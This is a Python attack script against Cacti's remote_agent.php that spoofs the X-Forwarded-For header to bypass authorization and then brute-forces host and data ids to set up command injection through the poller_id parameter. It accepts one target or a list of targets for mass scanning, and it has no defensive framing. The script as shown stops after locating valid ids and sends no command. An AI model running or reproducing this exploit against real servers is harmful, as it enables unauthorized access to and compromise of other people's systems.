import requests
import urllib3
import sys
import re
import argparse
from termcolor import colored
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main_url(url):
    print(f"\nTarget URL: {url} ")
    print("[*] Sending Requests ...")
    url1 = url+"/remote_agent.php?action=polldata"
    url2 = url+"/cacti/remote_agent.php?action=polldata"

    try:
        req1 = requests.get(url1,verify=False)
        req2 = requests.get(url2,verify=False)
        if (req1.status_code == 200):
            return url1
        elif (req2.status_code == 200):
            return url2
        else:
            print("[!] 404 Request => Not Vulnerable :(")
            return 1
    except requests.exceptions.ConnectionError:
        print("[!] Connection refused")
        return 1

def add_header(URL, ip_domain):
    headers_x1 = {"X-Forwarded-For":"127.0.0.1"}
    headers_x2 = {"X-Forwarded-For": ip_domain}
    req_bp1 = requests.get(URL+"&poller_id=1&host_id=1&local_data_ids[]=1",headers=headers_x1,verify=False)
    req_bp2 = requests.get(URL+"&poller_id=1&host_id=1&local_data_ids[]=1",headers=headers_x2,verify=False)
    if (req_bp1.status_code == 200 and req_bp1.text != "FATAL: You are not authorized to use this service"):
        print("[*] Bypassed => Might Be Vulnerable")
        return headers_x1
    elif (req_bp2.status_code == 200 and req_bp2.text != "FATAL: You are not authorized to use this service"):
        print(f"[*] Bypassed => Might Be Vulnerable")
        return headers_x2
    else:
        print("[!] Bypassing Failed => Not Vulnerable !!!")
        return 1
        #exit(0)

def finding_id(URL,HEADER):
    words = ["cpu","cmd.php","polling_time","apache"]
    print("[*] Brute-Forcing Process Is Running ...")
    last_url = None
    for id in range(1,11):
        for item in range(1,11):
            url_id = URL+f"&poller_id=1&host_id={str(id)}&local_data_ids[]={str(item)}"
            req_id = requests.get(url_id,headers=HEADER,verify=False)
            if any(x in req_id.text for x in words):
                last_url = URL+f"&host_id={str(id)}&local_data_ids[]={str(item)}&poller_id="
                print("[*] True Ids Founded")
                return last_url
    print("[!] Could Not Find Specific Process")
    return 1
    #exit(0)

def exploit(url):
    URL = main_url(url)
    if URL != 1:
        main_ip = re.findall(r"^(?:https?:\/\/)?(?:[^@\/\n]+@)?(?:www\.)?([^:\/\n]+)",URL)
        ip_domain = str(main_ip[0])
        HEADER = add_header(URL, ip_domain)
        if HEADER != 1:
            l_URL = finding_id(URL,HEADER)

if __name__ == "__main__":

	## parse argument
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', help='The URL of the target, eg: http://127.0.0.1', default=False)
	parser.add_argument("-l", "--list", action="store", help="List of target url saperated with new line", default=False)
	args = parser.parse_args()

	if args.target is not False:
		exploit(args.target) 
	
	elif args.list is not False:		
		with open(args.list) as targets:
			for target in targets:
				target = target.rstrip()
				exploit(target) 

	else:
		parser.print_help()
		parser.exit()
